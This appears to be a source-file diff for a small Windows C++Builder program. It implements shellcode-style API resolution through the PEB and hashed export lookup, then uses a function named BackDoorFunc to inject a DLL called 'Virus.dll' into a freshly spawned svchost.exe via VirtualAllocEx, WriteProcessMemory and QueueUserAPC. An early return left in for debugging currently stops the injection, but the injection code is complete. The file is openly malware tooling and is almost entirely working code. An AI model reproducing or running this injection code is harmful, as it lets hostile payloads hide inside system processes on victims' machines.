@@ -1,0 +1,164 @@
+#include <vcl.h>
+#pragma hdrstop
+#include <tchar.h>
+
+void __declspec(naked) HashFunc()
+{
+	asm
+	{
+		xor edi, edi
+		xor eax, eax
+		cld
+
+	compute_hash_again:
+		lodsb
+		test eax, eax
+		jz compute_hash_finished
+		ror edi, 0x0D
+		add edi, eax
+		jmp compute_hash_again
+		compute_hash_finished:
+		mov eax,edi
+		ret
+	}
+}
+
+DWORD __declspec(naked) GetProcAddrEx(DWORD ModAddr, int HashVal)
+{
+
+	asm
+	{
+
+		push 0x90909090
+		pushad
+		mov ebp, [esp+0x28]//GET DLL Base
+		mov ebx, [ebp+0x3C]//e_iframe Offset(DOS Header)
+		add ebx, ebp//EBX Point To NTHeader Address.
+		mov ebx, [ebx+0x78]//EBX = IMAGE_DIRECTORY_ENTRY_EXPORT Offset
+		add ebx, ebp//EBX Point To IMAGE_DIRECTORY_ENTRY_EXPORT
+		mov ecx, [ebx+0x18]//ECX = Number Of Names
+		dec ecx
+
+		NextFind:
+		mov edx, [ebx+0x20]//EDX = Offset Of Name Address Array.
+		add edx, ebp//EDX Point to Name Address Array.
+		mov edx, [edx+ecx*4]//ECX(index) * sizeof(DWORD) + Name Array Address.
+		add edx, ebp//Offset + eax(Kernel32.dll address) = Current String Address.
+		dec ecx
+		jl MyLeave//Find Fail.
+
+		mov esi, edx
+		call HashFunc
+		cmp eax, [esp+0x2C]
+		jne NextFind
+		inc ecx//前面會多扣一次,這邊我們補回來.
+		mov eax, [ebx+0x24]//EDX = AddressOfNameOrdinals  Array Offset.
+		add eax, ebp//EDX Point to AddressOfNameOrdinals  Address.
+		mov cx, [eax+ecx*2]//ECX = AddressOfNameOrdinals  + Index As WORD(2 BYTE)
+		mov eax,[ebx+0x1C]//EDX = AddressOfFunction Array Offset.
+		add eax, ebp//EDX Point to AddressOfFunction Array Address.
+		mov eax, [eax+ecx*4]//Set EDX = Value Of AddressOfFunction[Index] = Offset.
+		add eax, ebp//EDX Point to Function Address.
+		MyLeave:
+		mov [esp+0x20],eax
+		popad
+		pop eax
+		ret 0x08
+	}
+}
+
+DWORD GetKernel32Mod()
+{
+	DWORD dRetn = 0;
+	asm
+	{
+		pushad
+		mov ebx,fs:[0x30] //PEB
+		mov ebx,[ebx+0x0c]//Ldr
+		mov ebx,[ebx+0x1c]//InInitializationOrderModuleList
+		Search:
+		mov eax,[ebx+0x08]//Point to Current Modual Base.
+		mov ecx,[ebx+0x20]//Point to Current Name.
+		cmp [ecx+0x18],0x00//Test if Name[25] == \x00.
+		mov ebx,[ebx+0x00]
+		jne Search
+		mov [dRetn],eax
+		popad
+	}
+	return dRetn;
+}
+
+void BackDoorFunc()
+{
+	int GetKernel32Base = 0x77170000;// GetKernel32Mod();
+
+   //	ShowMessage(IntToHex(GetKernel32Base,8));
+	int GetLoadLibraryA__Addr = GetProcAddrEx(GetKernel32Base,0xEC0E4E8E);
+	ShowMessage(IntToHex((int)GetLoadLibraryA__Addr,8));
+	return;
+	STARTUPINFO StartInfo = {};
+	PROCESS_INFORMATION ProcInfo = {};
+	StartInfo.cb = sizeof(StartInfo);
+	int result = CreateProcess(L"C:\\Windows\\system32\\svchost.exe",
+								0,
+								0,
+								0,
+								0,
+								0,
+								0,
+								0,
+								&StartInfo,
+								&ProcInfo);
+	if (!result)
+	{
+		ShowMessage("CreateProcess Fail");
+		return;
+	}
+
+
+	AnsiString CurPath = ExtractFilePath(Application->ExeName);
+	char* DllPath = AnsiString(CurPath + "Virus.dll").c_str() ;
+	DWORD DllPathLen = strlen(DllPath) + 1;
+	HMODULE KernelModAddr = GetModuleHandle(L"Kernel32.dll");
+	FARPROC LoadLibraryAddr = GetProcAddress(KernelModAddr, "LoadLibraryA");
+	if ((!KernelModAddr) || (!LoadLibraryAddr))
+	{
+		ShowMessage("Get ModualBase Fail");
+		return;
+	}
+	PVOID param = VirtualAllocEx(ProcInfo.hProcess , NULL, DllPathLen ,MEM_COMMIT | MEM_TOP_DOWN,PAGE_READWRITE);
+	if (!param)
+	{
+		ShowMessage("Memory Alloc Fail");
+		return;
+	}
+	WriteProcessMemory(ProcInfo.hProcess, param,(LPVOID)DllPath, DllPathLen, 0);
+	QueueUserAPC((PAPCFUNC)LoadLibraryAddr,ProcInfo.hThread ,(DWORD)param);
+	ShowMessage("Over");
+}
+
+
+int WINAPI _tWinMain(HINSTANCE, HINSTANCE, LPTSTR, int)
+{
+	try
+	{
+		BackDoorFunc();
+	}
+	catch (Exception &exception)
+	{
+		Application->ShowException(&exception);
+	}
+	catch (...)
+	{
+		try
+		{
+			throw Exception("");
+		}
+		catch (Exception &exception)
+		{
+			Application->ShowException(&exception);
+		}
+	}
+	return 0;
+}
+//---------------------------------------------------------------------------
